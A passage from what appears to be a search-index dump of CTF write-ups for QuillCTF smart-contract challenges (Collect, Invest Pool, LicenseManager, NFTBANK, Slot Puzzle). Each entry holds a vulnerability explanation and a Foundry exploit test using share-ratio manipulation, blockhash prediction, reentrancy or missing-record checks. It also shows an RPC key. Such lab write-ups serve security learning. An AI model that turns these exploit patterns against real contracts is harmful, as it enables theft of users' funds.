tokensOwed0 , position . tokensOwed1 ) = ( position . tokensOwed0 + uint128 ( amount0 ), position . tokensOwed1 + uint128 ( amount1 ) ); } Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8 ; import \"forge-std/Test.sol\" ; import { ERC20 } from \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\" ; import { INonfungiblePositionManager } from \"v3-periphery/interfaces/INonfungiblePositionManager.sol\" ; import { TickMath } from \"v3-core/libraries/TickMath.sol\" ; import { IUniswapV3Factory } from \"v3-core/interfaces/IUniswapV3Factory.sol\" ; import { IUniswapV3Pool } from \"v3-core/interfaces/IUniswapV3Pool.sol\" ; import { ISwapRouter } from \"v3-periphery/interfaces/ISwapRouter.sol\" ; // install: // forge install Openzeppelin/openzeppelin-contracts // forge install Uniswap/v3-periphery@0.8 // forge install Uniswap/v3-core@0.8 contract Token is ERC20 { constructor ( string memory name , string memory symbol , uint initialMint ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialMint ); } } contract NFTRent is Test { Token DogToken ; Token CatToken ; uint tokenId1 ; uint defiMasterLP ; uint128 defiMasterLiquidity ; uint liquidity ; address owner = makeAddr ( \"owner\" ); address defiMaster = makeAddr ( \"defiMaster\" ); address user = makeAddr ( \"user\" ); uint24 poolFee = 3000 ; IUniswapV3Pool pool ; ISwapRouter router = ISwapRouter ( 0xE592427A0AEce92De3Edee1F18E0157C05861564 ); INonfungiblePositionManager nonfungiblePositionManager = INonfungiblePositionManager ( 0xC36442b4a4522E871399CD717aBDD847Ab11FE88 ); IUniswapV3Factory UNISWAP_FACTORY = IUniswapV3Factory ( 0x1F98431c8aD98523631AE4a59f267346ea31F984 ); function setUp () public { vm . createSelectFork ( \"https://eth-mainnet.g.alchemy.com/v2/qtTzV89cHW8dqC9y-6BcCNYAPd22EAoU\" ); vm . startPrank ( owner ); DogToken = new Token ( \"DogToken\" , \"DogToken\" , 1000000 ether ); CatToken = new Token ( \"CatToken\" , \"CatToken\" , 1000000 ether ); // gift from owner to user DogToken . transfer ( user , 10000 ether ); CatToken . transfer ( user , 10000 ether ); // owner lp nonfungiblePositionManager . createAndInitializePoolIfNecessary ( address ( DogToken ), address ( CatToken ), 3000 , 1 << 96 ); pool = IUniswapV3Pool ( UNISWAP_FACTORY . getPool ( address ( DogToken ), address ( CatToken ), 3000 ) ); DogToken . approve ( address ( nonfungiblePositionManager ), 10000 ether ); CatToken . approve ( address ( nonfungiblePositionManager ), 10000 ether ); INonfungiblePositionManager . MintParams memory params = INonfungiblePositionManager . MintParams ({ token0 : address ( DogToken ), token1 : address ( CatToken ), fee : poolFee , tickLower : - 887220 , tickUpper : 887220 , amount0Desired : 1000 ether , amount1Desired : 1000 ether , amount0Min : 0 , amount1Min : 0 , recipient : owner , deadline : block . timestamp }); nonfungiblePositionManager . mint ( params ); ( defiMasterLP , defiMasterLiquidity , , ) = nonfungiblePositionManager . mint ( params ); // owner send to defiMaster LP 721 token nonfungiblePositionManager . safeTransferFrom ( owner , defiMaster , defiMasterLP ); vm . stopPrank (); } function test_solution () public { // solution vm . startPrank ( defiMaster ); nonfungiblePositionManager . decreaseLiquidity ( INonfungiblePositionManager . DecreaseLiquidityParams ({ tokenId : defiMasterLP , liquidity : defiMasterLiquidity , amount0Min : 0 , amount1Min : 0 , deadline : block . timestamp }) ); vm . stopPrank (); // end solution vm . startPrank ( user ); CatToken . approve ( address ( router ), 100 ether ); DogToken . approve ( address ( router ), 100 ether ); ISwapRouter . ExactInputSingleParams memory params = ISwapRouter . ExactInputSingleParams ({ tokenIn : address ( CatToken ), tokenOut : address ( DogToken ), fee : 3000 , recipient : user , deadline : block . timestamp , amountIn : 100 ether , amountOutMinimum : 0 , sqrtPriceLimitX96 : 0 }); router . exactInputSingle ( params ); vm . stopPrank (); vm . startPrank ( defiMaster ); INonfungiblePositionManager . CollectParams memory collectParams = INonfungiblePositionManager . CollectParams ({ tokenId : defiMasterLP , recipient : defiMaster , amount0Max : type ( uint128 ). max , amount1Max : type ( uint128 ). max }); (, uint collectAmount1 ) = nonfungiblePositionManager . collect ( collectParams ); assertGt ( collectAmount1 , 298214374191364123 ); vm . stopPrank (); } }","title":"Collect"},{"location":"wargames/quillctf/collect/#objective-of-ctf","text":"You have 1 LP from the owner. At the end of the test, you collect commission from your LP. But it's too small for you. Increase the amount of commission, which you can get. QuillCTF Challenges - Collect","title":"Objective of CTF"},{"location":"wargames/quillctf/collect/#vulnerability-description","text":"The amount obtained from collect() is related to the amount of owed by the position 1 2 3 4 5 6 7 8 9 10 11 12 13 // UniswapV3Pool.sol function collect ( address recipient , int24 tickLower , int24 tickUpper , uint128 amount0Requested , uint128 amount1Requested ) external override lock returns ( uint128 amount0 , uint128 amount1 ) { ... amount0 = amount0Requested > position . tokensOwed0 ? position . tokensOwed0 : amount0Requested ; amount1 = amount1Requested > position . tokensOwed1 ? position . tokensOwed1 : amount1Requested ; ... } We need to increase the amount of commission, i.e. position.tokensOwed We can simply decrease all the liquidity defiMaster has, and the amount of token will be added to the tokensOwed 1 2 3 4 5 6 if ( amount0 > 0 || amount1 > 0 ) { ( position . tokensOwed0 , position . tokensOwed1 ) = ( position . tokensOwed0 + uint128 ( amount0 ), position . tokensOwed1 + uint128 ( amount1 ) ); }","title":"Vulnerability Description"},{"location":"wargames/quillctf/collect/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8 ; import \"forge-std/Test.sol\" ; import { ERC20 } from \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\" ; import { INonfungiblePositionManager } from \"v3-periphery/interfaces/INonfungiblePositionManager.sol\" ; import { TickMath } from \"v3-core/libraries/TickMath.sol\" ; import { IUniswapV3Factory } from \"v3-core/interfaces/IUniswapV3Factory.sol\" ; import { IUniswapV3Pool } from \"v3-core/interfaces/IUniswapV3Pool.sol\" ; import { ISwapRouter } from \"v3-periphery/interfaces/ISwapRouter.sol\" ; // install: // forge install Openzeppelin/openzeppelin-contracts // forge install Uniswap/v3-periphery@0.8 // forge install Uniswap/v3-core@0.8 contract Token is ERC20 { constructor ( string memory name , string memory symbol , uint initialMint ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialMint ); } } contract NFTRent is Test { Token DogToken ; Token CatToken ; uint tokenId1 ; uint defiMasterLP ; uint128 defiMasterLiquidity ; uint liquidity ; address owner = makeAddr ( \"owner\" ); address defiMaster = makeAddr ( \"defiMaster\" ); address user = makeAddr ( \"user\" ); uint24 poolFee = 3000 ; IUniswapV3Pool pool ; ISwapRouter router = ISwapRouter ( 0xE592427A0AEce92De3Edee1F18E0157C05861564 ); INonfungiblePositionManager nonfungiblePositionManager = INonfungiblePositionManager ( 0xC36442b4a4522E871399CD717aBDD847Ab11FE88 ); IUniswapV3Factory UNISWAP_FACTORY = IUniswapV3Factory ( 0x1F98431c8aD98523631AE4a59f267346ea31F984 ); function setUp () public { vm . createSelectFork ( \"https://eth-mainnet.g.alchemy.com/v2/qtTzV89cHW8dqC9y-6BcCNYAPd22EAoU\" ); vm . startPrank ( owner ); DogToken = new Token ( \"DogToken\" , \"DogToken\" , 1000000 ether ); CatToken = new Token ( \"CatToken\" , \"CatToken\" , 1000000 ether ); // gift from owner to user DogToken . transfer ( user , 10000 ether ); CatToken . transfer ( user , 10000 ether ); // owner lp nonfungiblePositionManager . createAndInitializePoolIfNecessary ( address ( DogToken ), address ( CatToken ), 3000 , 1 << 96 ); pool = IUniswapV3Pool ( UNISWAP_FACTORY . getPool ( address ( DogToken ), address ( CatToken ), 3000 ) ); DogToken . approve ( address ( nonfungiblePositionManager ), 10000 ether ); CatToken . approve ( address ( nonfungiblePositionManager ), 10000 ether ); INonfungiblePositionManager . MintParams memory params = INonfungiblePositionManager . MintParams ({ token0 : address ( DogToken ), token1 : address ( CatToken ), fee : poolFee , tickLower : - 887220 , tickUpper : 887220 , amount0Desired : 1000 ether , amount1Desired : 1000 ether , amount0Min : 0 , amount1Min : 0 , recipient : owner , deadline : block . timestamp }); nonfungiblePositionManager . mint ( params ); ( defiMasterLP , defiMasterLiquidity , , ) = nonfungiblePositionManager . mint ( params ); // owner send to defiMaster LP 721 token nonfungiblePositionManager . safeTransferFrom ( owner , defiMaster , defiMasterLP ); vm . stopPrank (); } function test_solution () public { // solution vm . startPrank ( defiMaster ); nonfungiblePositionManager . decreaseLiquidity ( INonfungiblePositionManager . DecreaseLiquidityParams ({ tokenId : defiMasterLP , liquidity : defiMasterLiquidity , amount0Min : 0 , amount1Min : 0 , deadline : block . timestamp }) ); vm . stopPrank (); // end solution vm . startPrank ( user ); CatToken . approve ( address ( router ), 100 ether ); DogToken . approve ( address ( router ), 100 ether ); ISwapRouter . ExactInputSingleParams memory params = ISwapRouter . ExactInputSingleParams ({ tokenIn : address ( CatToken ), tokenOut : address ( DogToken ), fee : 3000 , recipient : user , deadline : block . timestamp , amountIn : 100 ether , amountOutMinimum : 0 , sqrtPriceLimitX96 : 0 }); router . exactInputSingle ( params ); vm . stopPrank (); vm . startPrank ( defiMaster ); INonfungiblePositionManager . CollectParams memory collectParams = INonfungiblePositionManager . CollectParams ({ tokenId : defiMasterLP , recipient : defiMaster , amount0Max : type ( uint128 ). max , amount1Max : type ( uint128 ). max }); (, uint collectAmount1 ) = nonfungiblePositionManager . collect ( collectParams ); assertGt ( collectAmount1 , 298214374191364123 ); vm . stopPrank (); } }","title":"Proof of Concept"},{"location":"wargames/quillctf/invest_pool/","tags":["smart contract","metadata","ipfs"],"text":"#smart contract #metadata #ipfs .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 Your objective is to have a greater token balance than your initial balance. QuillCTF Challenges - Invest Pool Vulnerability Description \u00b6 We need to set initialized to true first, in order to use deposit() and withdrawAll() The password can be obtained from Solidity Metadata (got hint from Discord) I used playground.sourcify.dev and got the password from https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V (The metadata hash is base58 encoded) :D tokenToShares() and sharesToToken() are calculated using the current token balance of the pool, and we can transfer tokens to the pool without calling deposit() . Therefore, we can manipulate the ratio of share to token Attack Steps \u00b6 initialize() with the password from the metadata The hacker deposits 1 token, then transfers 1e18 tokens to the pool directly. The current ratio of share to the token is 1: 1e18 + 1 The user deposits 1000e18 tokens. Because of rounding down, the user can only receive 999 shares. Now the pool has 1000 shares and 1001e18 + 1 token. The current ratio of share to the token is about 1: 1001e15 The hacker withdraws Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // SPDX-License-Identifier: MIT pragma solidity 0.8.7 ; import \"forge-std/Test.sol\" ; import \"../src/poolToken.sol\" ; import \"../src/investPool.sol\" ; contract Hack is Test { PoolToken token ; InvestPool pool ; address user = vm . addr ( 1 ); address hacker = vm . addr ( 2 ); function setUp () external { token = new PoolToken (); pool = new InvestPool ( address ( token )); token . mint ( 2000e18 ); token . transfer ( user , 1000e18 ); token . transfer ( hacker , 1000e18 ); vm . prank ( user ); token . approve ( address ( pool ), type ( uint ). max ); vm . prank ( hacker ); token . approve ( address ( pool ), type ( uint ). max ); } function userDeposit ( uint amount ) public { vm . prank ( user ); pool . deposit ( amount ); vm . stopPrank (); } function test_hack () public { uint hackerBalanceBeforeHack = token . balanceOf ( hacker ); vm . startPrank ( hacker ); // solution pool . initialize ( \"j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx\" ); pool . deposit ( 1 ); token . transfer ( address ( pool ), 1e18 ); vm . stopPrank (); userDeposit ( 1000e18 ); vm . prank ( hacker ); pool . withdrawAll (); vm . stopPrank (); assertGt ( token . balanceOf ( hacker ), hackerBalanceBeforeHack ); } }","title":"Invest Pool"},{"location":"wargames/quillctf/invest_pool/#objective-of-ctf","text":"Your objective is to have a greater token balance than your initial balance. QuillCTF Challenges - Invest Pool","title":"Objective of CTF"},{"location":"wargames/quillctf/invest_pool/#vulnerability-description","text":"We need to set initialized to true first, in order to use deposit() and withdrawAll() The password can be obtained from Solidity Metadata (got hint from Discord) I used playground.sourcify.dev and got the password from https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V (The metadata hash is base58 encoded) :D tokenToShares() and sharesToToken() are calculated using the current token balance of the pool, and we can transfer tokens to the pool without calling deposit() . Therefore, we can manipulate the ratio of share to token","title":"Vulnerability Description"},{"location":"wargames/quillctf/invest_pool/#attack-steps","text":"initialize() with the password from the metadata The hacker deposits 1 token, then transfers 1e18 tokens to the pool directly. The current ratio of share to the token is 1: 1e18 + 1 The user deposits 1000e18 tokens. Because of rounding down, the user can only receive 999 shares. Now the pool has 1000 shares and 1001e18 + 1 token. The current ratio of share to the token is about 1: 1001e15 The hacker withdraws","title":"Attack Steps"},{"location":"wargames/quillctf/invest_pool/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // SPDX-License-Identifier: MIT pragma solidity 0.8.7 ; import \"forge-std/Test.sol\" ; import \"../src/poolToken.sol\" ; import \"../src/investPool.sol\" ; contract Hack is Test { PoolToken token ; InvestPool pool ; address user = vm . addr ( 1 ); address hacker = vm . addr ( 2 ); function setUp () external { token = new PoolToken (); pool = new InvestPool ( address ( token )); token . mint ( 2000e18 ); token . transfer ( user , 1000e18 ); token . transfer ( hacker , 1000e18 ); vm . prank ( user ); token . approve ( address ( pool ), type ( uint ). max ); vm . prank ( hacker ); token . approve ( address ( pool ), type ( uint ). max ); } function userDeposit ( uint amount ) public { vm . prank ( user ); pool . deposit ( amount ); vm . stopPrank (); } function test_hack () public { uint hackerBalanceBeforeHack = token . balanceOf ( hacker ); vm . startPrank ( hacker ); // solution pool . initialize ( \"j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx\" ); pool . deposit ( 1 ); token . transfer ( address ( pool ), 1e18 ); vm . stopPrank (); userDeposit ( 1000e18 ); vm . prank ( hacker ); pool . withdrawAll (); vm . stopPrank (); assertGt ( token . balanceOf ( hacker ), hackerBalanceBeforeHack ); } }","title":"Proof of Concept"},{"location":"wargames/quillctf/license_manager/","tags":["smart contract","weak randomness","reentrancy"],"text":"#smart contract #weak randomness #reentrancy .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 Get the license and find at least two ways to collect the ethers in the contract before the owner notices QuillCTF Challenges - LicenseManager Vulnerability Description \u00b6 As an attacker, we can get a license with 0.01 ether through winLicense() . pickedNumber should be less than maxThreshold to get the license. We can not change the msg.value because we only have 0.01 ether which is the minimum required amount. Thus, we just wait until the block hash of the previous block satisfies the condition. Since refundLicense() does not check if msg.sender is in the licensed array, we can refund the license and get 1 ether. collect the ethers in the contract before the owner notices in second way We can buy a license since we have 1 ether this time. The licenseOwners is set to false after ETH transfer, so we can reentrant refundLicense() to get more ETH. Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"forge-std/Test.sol\" ; import \"../src/LicenseManager.sol\" ; /** * @title Test contract for LicenseManager */ contract LicenseManagerTest is Test { LicenseManager license ; address owner = makeAddr ( \"owner\" ); address user1 = makeAddr ( \"user1\" ); address user2 = makeAddr ( \"user2\" ); address user3 = makeAddr ( \"user3\" ); address user4 = makeAddr ( \"user4\" ); address attacker = makeAddr ( \"attacker\" ); function setUp () public { vm . prank ( owner ); license = new LicenseManager (); vm . deal ( user1 , 1 ether ); vm . deal ( user2 , 1 ether ); vm . deal ( user3 , 1 ether ); vm . deal ( user4 , 1 ether ); vm . prank ( user1 ); license . buyLicense { value : 1 ether }(); vm . prank ( user2 ); license . buyLicense { value : 1 ether }(); vm . prank ( user3 ); license . buyLicense { value : 1 ether }(); vm . prank ( user4 ); license . buyLicense { value : 1 ether }(); } function test_exploit1_2 () public { vm . deal ( attacker , 0.01 ether ); vm . startPrank ( attacker ); // Challenge 1 solution uint pickedNumber = uint ( keccak256 ( abi . encodePacked ( uint256 ( 0.01 ether ), attacker , uint ( 1337 ), blockhash ( block . number - 1 )))) % 100 ; uint maxThreshold = uint ( 0.01 ether / 1e16 ); while ( pickedNumber >= maxThreshold ) { vm . roll ( block . number + 1 ); pickedNumber = uint ( keccak256 ( abi . encodePacked ( uint256 ( 0.01 ether ), attacker , uint ( 1337 ), blockhash ( block . number - 1 )))) % 100 ; } license . winLicense { value : 0.01 ether }(); // End assertEq ( true , license . checkLicense ()); vm . stopPrank (); vm . startPrank ( attacker ); // Challenge 2.1 solution license . refundLicense (); // End assertGt ( attacker . balance , 0.1 ether ); vm . stopPrank (); } /// collect the ethers in the contract before the owner notices in second way. function test_exploit3 () public { vm . deal ( address ( this ), 1 ether ); // challenge 2.2 solution license . buyLicense { value : 1 ether }(); license . refundLicense (); // End console . log ( \"\\tFinal Balance\\t\" , address ( this ). balance ); assertGt ( address ( this ). balance , 1 ether ); } fallback () external payable { if ( msg . sender . balance >= 1 ether ) license . refundLicense (); } }","title":"LicenseManager"},{"location":"wargames/quillctf/license_manager/#objective-of-ctf","text":"Get the license and find at least two ways to collect the ethers in the contract before the owner notices QuillCTF Challenges - LicenseManager","title":"Objective of CTF"},{"location":"wargames/quillctf/license_manager/#vulnerability-description","text":"As an attacker, we can get a license with 0.01 ether through winLicense() . pickedNumber should be less than maxThreshold to get the license. We can not change the msg.value because we only have 0.01 ether which is the minimum required amount. Thus, we just wait until the block hash of the previous block satisfies the condition. Since refundLicense() does not check if msg.sender is in the licensed array, we can refund the license and get 1 ether. collect the ethers in the contract before the owner notices in second way We can buy a license since we have 1 ether this time. The licenseOwners is set to false after ETH transfer, so we can reentrant refundLicense() to get more ETH.","title":"Vulnerability Description"},{"location":"wargames/quillctf/license_manager/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"forge-std/Test.sol\" ; import \"../src/LicenseManager.sol\" ; /** * @title Test contract for LicenseManager */ contract LicenseManagerTest is Test { LicenseManager license ; address owner = makeAddr ( \"owner\" ); address user1 = makeAddr ( \"user1\" ); address user2 = makeAddr ( \"user2\" ); address user3 = makeAddr ( \"user3\" ); address user4 = makeAddr ( \"user4\" ); address attacker = makeAddr ( \"attacker\" ); function setUp () public { vm . prank ( owner ); license = new LicenseManager (); vm . deal ( user1 , 1 ether ); vm . deal ( user2 , 1 ether ); vm . deal ( user3 , 1 ether ); vm . deal ( user4 , 1 ether ); vm . prank ( user1 ); license . buyLicense { value : 1 ether }(); vm . prank ( user2 ); license . buyLicense { value : 1 ether }(); vm . prank ( user3 ); license . buyLicense { value : 1 ether }(); vm . prank ( user4 ); license . buyLicense { value : 1 ether }(); } function test_exploit1_2 () public { vm . deal ( attacker , 0.01 ether ); vm . startPrank ( attacker ); // Challenge 1 solution uint pickedNumber = uint ( keccak256 ( abi . encodePacked ( uint256 ( 0.01 ether ), attacker , uint ( 1337 ), blockhash ( block . number - 1 )))) % 100 ; uint maxThreshold = uint ( 0.01 ether / 1e16 ); while ( pickedNumber >= maxThreshold ) { vm . roll ( block . number + 1 ); pickedNumber = uint ( keccak256 ( abi . encodePacked ( uint256 ( 0.01 ether ), attacker , uint ( 1337 ), blockhash ( block . number - 1 )))) % 100 ; } license . winLicense { value : 0.01 ether }(); // End assertEq ( true , license . checkLicense ()); vm . stopPrank (); vm . startPrank ( attacker ); // Challenge 2.1 solution license . refundLicense (); // End assertGt ( attacker . balance , 0.1 ether ); vm . stopPrank (); } /// collect the ethers in the contract before the owner notices in second way. function test_exploit3 () public { vm . deal ( address ( this ), 1 ether ); // challenge 2.2 solution license . buyLicense { value : 1 ether }(); license . refundLicense (); // End console . log ( \"\\tFinal Balance\\t\" , address ( this ). balance ); assertGt ( address ( this ). balance , 1 ether ); } fallback () external payable { if ( msg . sender . balance >= 1 ether ) license . refundLicense (); } }","title":"Proof of Concept"},{"location":"wargames/quillctf/nftbank/","tags":["smart contract","nft","data validation"],"text":"#smart contract #nft #data validation .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 You rent an NFT. After 10 days have passed, if you should hack the contract, and finally have the NFT, the contract should not show, that you have debt. QuillCTF Challenges - NFTBANK Vulnerability Description \u00b6 There is no check whether an NFT is already added in the addNFT() function The NFT related record is not deleted after withdrawing the NFT, including nftData and rentData Attack Steps \u00b6 Approve the NFTBank for spending token and update the NFT config data through addNFT() function Get back the NFT. Since previous rentData is not deleted from rentNFTs, call refund() to get the startRentFee back Get the NFT back again :) Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8 ; import \"forge-std/Test.sol\" ; import { NFTBank } from \"../src/NFTBank.sol\" ; import { ERC721 } from \"openzeppelin-contracts/contracts/token/ERC721/ERC721.sol\" ; import { Ownable } from \"openzeppelin-contracts/contracts/access/Ownable.sol\" ; contract CryptoKitties is ERC721 ( \"CryptoKitties\" , \"MEOW\" ), Ownable { function mint ( address to , uint id ) external onlyOwner { _safeMint ( to , id ); } } contract NFTBankHack is Test { NFTBank bank ; CryptoKitties meow ; address nftOwner = makeAddr ( \"nftOwner\" ); address attacker = makeAddr ( \"attacker\" ); function setUp () public { vm . startPrank ( nftOwner ); bank = new NFTBank (); meow = new CryptoKitties (); for ( uint i ; i < 10 ; i ++ ) { meow . mint ( nftOwner , i ); meow . approve ( address ( bank ), i ); bank . addNFT ( address ( meow ), i , 2 gwei , 500 gwei ); } vm . stopPrank (); } function test () public { vm . deal ( attacker , 1 ether ); vm . startPrank ( attacker ); bank . rent { value : 500 gwei }( address ( meow ), 1 ); vm . warp ( block . timestamp + 86400 * 10 ); // solution meow . setApprovalForAll ( address ( bank ), true ); bank . addNFT ( address ( meow ), 1 , 0 , 500 gwei ); bank . getBackNft ( address ( meow ), 1 , payable ( attacker )); bank . refund ( address ( meow ), 1 ); bank . getBackNft ( address ( meow ), 1 , payable ( attacker )); // end solution vm . stopPrank (); assertEq ( attacker . balance , 1 ether ); assertEq ( meow . ownerOf ( 1 ), attacker ); } }","title":"NFTBANK"},{"location":"wargames/quillctf/nftbank/#objective-of-ctf","text":"You rent an NFT. After 10 days have passed, if you should hack the contract, and finally have the NFT, the contract should not show, that you have debt. QuillCTF Challenges - NFTBANK","title":"Objective of CTF"},{"location":"wargames/quillctf/nftbank/#vulnerability-description","text":"There is no check whether an NFT is already added in the addNFT() function The NFT related record is not deleted after withdrawing the NFT, including nftData and rentData","title":"Vulnerability Description"},{"location":"wargames/quillctf/nftbank/#attack-steps","text":"Approve the NFTBank for spending token and update the NFT config data through addNFT() function Get back the NFT. Since previous rentData is not deleted from rentNFTs, call refund() to get the startRentFee back Get the NFT back again :)","title":"Attack Steps"},{"location":"wargames/quillctf/nftbank/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8 ; import \"forge-std/Test.sol\" ; import { NFTBank } from \"../src/NFTBank.sol\" ; import { ERC721 } from \"openzeppelin-contracts/contracts/token/ERC721/ERC721.sol\" ; import { Ownable } from \"openzeppelin-contracts/contracts/access/Ownable.sol\" ; contract CryptoKitties is ERC721 ( \"CryptoKitties\" , \"MEOW\" ), Ownable { function mint ( address to , uint id ) external onlyOwner { _safeMint ( to , id ); } } contract NFTBankHack is Test { NFTBank bank ; CryptoKitties meow ; address nftOwner = makeAddr ( \"nftOwner\" ); address attacker = makeAddr ( \"attacker\" ); function setUp () public { vm . startPrank ( nftOwner ); bank = new NFTBank (); meow = new CryptoKitties (); for ( uint i ; i < 10 ; i ++ ) { meow . mint ( nftOwner , i ); meow . approve ( address ( bank ), i ); bank . addNFT ( address ( meow ), i , 2 gwei , 500 gwei ); } vm . stopPrank (); } function test () public { vm . deal ( attacker , 1 ether ); vm . startPrank ( attacker ); bank . rent { value : 500 gwei }( address ( meow ), 1 ); vm . warp ( block . timestamp + 86400 * 10 ); // solution meow . setApprovalForAll ( address ( bank ), true ); bank . addNFT ( address ( meow ), 1 , 0 , 500 gwei ); bank . getBackNft ( address ( meow ), 1 , payable ( attacker )); bank . refund ( address ( meow ), 1 ); bank . getBackNft ( address ( meow ), 1 , payable ( attacker )); // end solution vm . stopPrank (); assertEq ( attacker . balance , 1 ether ); assertEq ( meow . ownerOf ( 1 ), attacker ); } }","title":"Proof of Concept"},{"location":"wargames/quillctf/slot_puzzle/","tags":["smart contract","storage layout"],"text":"#smart contract #storage layout .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 Your purpose is just to call the deploy() function to recover the 3 ether. QuillCTF Challenges - Slot Puzzle Vulnerability Description \u00b6 Only the instance of SlotPuzzle deployed from SlotPuzzleFactory can call the payout() function to transfer ether and we need to pass the check in ascertainSlot() to let SlotPuzzle call payout() Calculate the slot iteratively according to keccak256(key, slot + (is ghostStore ? 1 : 0)) pattern We need three recipients, all pointing to hacker, to recover 3 ether since each payout() can only transfer 1 ether The difficult part is to decide offset > < params.slotKey is copy from calldata to memory. bytes memory slotKey stores the slotKey offset in memory, here is 0x80 The offset of slot is calculated using add(slotKey, calldataload(offset)) . So, the value of offset should be the offset of target value (i.e. slot.offset - slotKey) in the calldata. We can make use of Parameters.slotKey to pass that value Offset(Hex) Calldata Layout 04 offset of struct Parameters 24 totalRecipients, 3 44 offset 64 offset of the Recipients array (relative to struct offset) 84 offset of slotKey (relative to struct offset) a4 size of the Recipients array c4 recipients[0].account ... ... 184 size of slotKey 1a4 slot.offset - 0x80 1c4 slot Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.17 ; import \"forge-std/Test.sol\" ; import { SlotPuzzle } from \"src/SlotPuzzle.sol\" ; import { SlotPuzzleFactory } from \"src/SlotPuzzleFactory.sol\" ; import { Parameters , Recipients } from \"src/interface/ISlotPuzzleFactory.sol\" ; contract SlotPuzzleTest is Test { SlotPuzzle public slotPuzzle ; SlotPuzzleFactory public slotPuzzleFactory ; address hacker ; function setUp () public { slotPuzzleFactory = new SlotPuzzleFactory { value : 3 ether }(); hacker = makeAddr ( 